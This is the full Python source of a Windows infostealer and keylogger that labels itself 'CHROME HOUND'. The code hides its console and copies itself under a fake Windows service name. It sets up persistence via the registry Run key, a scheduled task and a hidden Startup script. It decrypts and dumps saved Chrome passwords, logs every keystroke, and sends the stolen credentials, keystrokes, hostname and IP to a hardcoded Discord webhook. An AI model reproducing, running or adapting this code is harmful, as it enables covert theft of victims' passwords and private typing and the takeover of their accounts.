import os, sys, json, base64, sqlite3, shutil, time, threading, ctypes
import socket, getpass, subprocess
from datetime import datetime
from pathlib import Path

WEBHOOK = "https://discord.com/api/webhooks/1525542643973623950/DTGBzliikTbhIKdVFM7qFB4VAGi335jk2STLiMYEKXh15UmGq9G_xqX6HVKi2FEjjjRP" 

def vanish():
    ctypes.windll.kernel32.FreeConsole()
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
vanish()

def install_autostart():
    if getattr(sys, 'frozen', False):
        my_path = sys.executable
    else:
        my_path = os.path.abspath(sys.argv[0])
    hidden_dir = Path(os.environ["APPDATA"]) / "Microsoft" / "Windows"
    hidden_dir.mkdir(parents=True, exist_ok=True)
    hidden_path = str(hidden_dir / "WinSvcHost.exe")
    if my_path != hidden_path:
        try:
            shutil.copy2(my_path, hidden_path)
        except:
            hidden_path = my_path
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, hidden_path)
        winreg.CloseKey(key)
    except:
        pass
    try:
        subprocess.run(
            f'schtasks /create /tn "MicrosoftWindowsUpdateTask" /tr "{hidden_path}" '
            f'/sc ONLOGON /ru {getpass.getuser()} /f /it',
            shell=True, capture_output=True, timeout=10)
    except:
        pass
    try:
        startup = Path(os.environ["APPDATA"]) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        startup.mkdir(parents=True, exist_ok=True)
        vbs = startup / "WindowsService.vbs"
        vbs.write_text(f'Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run "{hidden_path}", 0, False\n')
        subprocess.run(f'attrib +h "{vbs}"', shell=True, capture_output=True)
    except:
        pass
    return hidden_path

MY_PATH = install_autostart()

def get_master_key():
    path = Path(os.environ["LOCALAPPDATA"]) / "Google" / "Chrome" / "User Data" / "Local State"
    if not path.exists():
        return None
    try:
        data = json.loads(path.read_text("utf-8"))
        raw = base64.b64decode(data["os_crypt"]["encrypted_key"])
        assert raw[:5] == b"DPAPI"
        import win32crypt
        return win32crypt.CryptUnprotectData(raw[5:], None, None, None, 0)[1]
    except:
        return None

def decrypt_pw(ciphertext, key):
    try:
        from Cryptodome.Cipher import AES
    except:
        from Crypto.Cipher import AES
    try:
        nonce, ct, tag = ciphertext[3:15], ciphertext[15:-16], ciphertext[-16:]
        return AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag).decode()
    except:
        return None

def steal_creds(key):
    db = Path(os.environ["LOCALAPPDATA"]) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data"
    if not db.exists():
        return []
    tmp = Path(os.environ["TEMP"]) / f"ld_{os.getpid()}_{int(time.time())}.db"
    try:
        shutil.copy2(str(db), str(tmp))
    except:
        return []
    results = []
    try:
        conn = sqlite3.connect(str(tmp))
        c = conn.cursor()
        c.execute("SELECT origin_url, username_value, password_value FROM logins ORDER BY date_last_used DESC")
        for url, user, enc in c.fetchall():
            if not url or not enc:
                continue
            pw = decrypt_pw(enc, key)
            if pw:
                results.append({"url": url, "username": user, "password": pw})
        conn.close()
    except:
        pass
    try:
        tmp.unlink(missing_ok=True)
    except:
        pass
    return results

buffer = []
buffer_lock = threading.Lock()
shift_down = False
caps_down = False
running = True

def log(text):
    with buffer_lock:
        buffer.append(text)

def active_window_title():
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd) + 1
        b = ctypes.create_unicode_buffer(length)
        ctypes.windll.user32.GetWindowTextW(hwnd, b, length)
        return b.value or ""
    except:
        return ""

def keylog_sender(hostname):
    last_domain = ""
    while running:
        time.sleep(4)
        title = active_window_title()
        domain = ""
        for kw in ("chrome", "edge", "firefox", "brave", "opera", "mail", "outlook", "gmail"):
            if kw in title.lower():
                parts = title.split(" - ")
                domain = parts[0].strip() if parts else title
                if len(domain) > 30:
                    domain = domain[:30]
                break
        if domain and domain != last_domain:
            last_domain = domain
            log(f"\n── [{domain}] ──\n")
        with buffer_lock:
            if not buffer:
                continue
            content = "".join(buffer)
            buffer.clear()
        if content.strip():
            try:
                import requests
                requests.post(WEBHOOK, json={
                    "content": f"`{hostname[:8]}` `{datetime.now():%H:%M:%S}`\n```\n{content}\n```",
                    "username": f"KL-{hostname[:6]}"
                }, timeout=5)
            except:
                pass

def keylog_capture():
    global shift_down, caps_down
    prev = {}
    vk_list = list(range(0x08, 0xFF))
    while running:
        for vk in vk_list:
            try:
                import win32api
                state = win32api.GetAsyncKeyState(vk)
            except:
                continue
            pressed = (state & 0x8000) != 0
            was = prev.get(vk, False)
            if pressed and not was:
                prev[vk] = True
                if vk == 0x10:
                    shift_down = True
                if vk == 0x14:
                    caps_down = not caps_down
                if vk in (0x10, 0x11, 0x12, 0x14, 0x5B, 0x5C):
                    continue
                out = None
                names = {
                    0x08: "[BS]", 0x09: "[TAB]", 0x0D: "\n", 0x1B: "[ESC]",
                    0x20: " ", 0x2E: "[DEL]", 0x2D: "[INS]",
                    0x25: "[←]", 0x27: "[→]", 0x26: "[↑]", 0x28: "[↓]",
                    0x24: "[HOME]", 0x23: "[END]", 0x21: "[PGUP]", 0x22: "[PGDN]",
                    0x70: "[F1]", 0x71: "[F2]", 0x72: "[F3]", 0x73: "[F4]",
                    0x74: "[F5]", 0x75: "[F6]", 0x76: "[F7]", 0x77: "[F8]",
                    0x78: "[F9]", 0x79: "[F10]", 0x7A: "[F11]", 0x7B: "[F12]",
                }
                if vk in names:
                    out = names[vk]
                elif 0x41 <= vk <= 0x5A:
                    out = chr(vk) if (shift_down ^ caps_down) else chr(vk).lower()
                elif 0x30 <= vk <= 0x39:
                    special = ")!@#$%^&*("
                    out = special[vk - 0x30] if shift_down else str(vk - 0x30)
                elif vk == 0xBE: out = "." if not shift_down else ">"
                elif vk == 0xBC: out = "," if not shift_down else "<"
                elif vk == 0xBF: out = "/" if not shift_down else "?"
                elif vk == 0xBA: out = ";" if not shift_down else ":"
                elif vk == 0xDE: out = "'" if not shift_down else '"'
                elif vk == 0xDB: out = "[" if not shift_down else "{"
                elif vk == 0xDD: out = "]" if not shift_down else "}"
                elif vk == 0xDC: out = "\\" if not shift_down else "|"
                elif vk == 0xC0: out = "`" if not shift_down else "~"
                elif vk == 0xBD: out = "-" if not shift_down else "_"
                elif vk == 0xBB: out = "=" if not shift_down else "+"
                if out:
                    log(out)
            elif not pressed and was:
                prev[vk] = False
                if vk == 0x10:
                    shift_down = False
        time.sleep(0.003)

def send_beacon(hostname, username):
    try:
        import requests
        ip = requests.get("https://api.ipify.org", timeout=5).text
    except:
        ip = "Unknown"
    try:
        import requests
        requests.post(WEBHOOK, json={
            "embeds": [{
                "title": "CHROME HOUND ACTIVE",
                "description": f"Host: {hostname}\nUser: {username}\nIP: {ip}\nPID: {os.getpid()}\nPath: {MY_PATH}",
                "color": 0xED4245,
                "footer": {"text": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
            }]
        }, timeout=5)
    except:
        pass

def send_creds(creds, hostname, username):
    if not creds:
        return
    header = f"{len(creds)} credentials harvested from Chrome\n{hostname} | {username}\n\n"
    lines = [f"{c['url'][:60]} | {c['username'][:30]}:{c['password'][:50]}" for c in creds[:500]]
    body = header + "\n".join(lines)
    chunks = [body[i:i+1900] for i in range(0, len(body), 1900)]
    for chunk in chunks:
        try:
            import requests
            requests.post(WEBHOOK, json={
                "embeds": [{
                    "title": f"Chrome Dump - {hostname[:8]}",
                    "description": chunk,
                    "color": 0xFFA500,
                    "footer": {"text": f"{len(creds)} credentials"}
                }]
            }, timeout=5)
        except:
            pass

def main():
    hostname = socket.gethostname()
    username = getpass.getuser()
    threading.Thread(target=keylog_capture, daemon=True).start()
    threading.Thread(target=keylog_sender, args=(hostname,), daemon=True).start()
    send_beacon(hostname, username)
    master_key = get_master_key()
    if master_key:
        creds = steal_creds(master_key)
        if creds:
            send_creds(creds, hostname, username)
    last_hash = ""
    while running:
        time.sleep(60)
        if master_key:
            creds = steal_creds(master_key)
            h = "|".join(f"{c['url']}{c['username']}{c['password']}" for c in creds[:20])
            if creds and h != last_hash:
                last_hash = h
                send_creds(creds, hostname, username)

if __name__ == "__main__":
    try:
        main()
    except:
        pass
